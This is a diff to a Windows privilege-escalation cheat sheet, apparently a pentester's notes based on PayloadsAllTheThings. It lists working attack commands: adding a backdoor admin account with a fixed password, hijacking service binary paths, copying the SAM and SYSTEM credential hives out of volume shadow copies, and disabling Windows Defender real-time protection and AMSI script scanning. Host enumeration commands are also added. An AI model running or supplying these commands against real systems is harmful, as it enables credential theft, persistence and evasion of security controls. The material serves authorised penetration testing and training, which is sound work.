@@ -1,3 +1,5 @@
+#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
 
 #check permissions of file
 icacls C:\Users\myuser\poc.exe
@@ -10,6 +12,13 @@ net user adminuser Password1234! /add
 #Add user to local admins group:
 net localgroup Administrators adminuser /add
 
+#
+systeminfo
+whoami /groups
+whoami /privs
+wmic qfe
+#Environment variables
+set
 
 #Services
 sc query
@@ -22,12 +31,11 @@ shell sc config "scsrvc" start= disabled
 #modify binpath of service
 sc config <service name> binPath= <binary path>
 
-#Volume shadow copies
-#Needs admin rights
-vssadmin create shadow /for=C:
+#Registry autoruns
+reg query HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
 
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\user\
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\user\
+#Scheduled tasks
+schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 
 
 
@@ -42,3 +50,23 @@ DRIVERQUERY /V
 
 #list all files recursively
 dir /b /a /s
+
+
+#Needs admin rights
+
+#Volume shadow copies
+vssadmin list shadow
+vssadmin create shadow /for=C:
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\user\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\user\
+
+#Disable defender
+# disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+# disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1
+
+
+#Egress
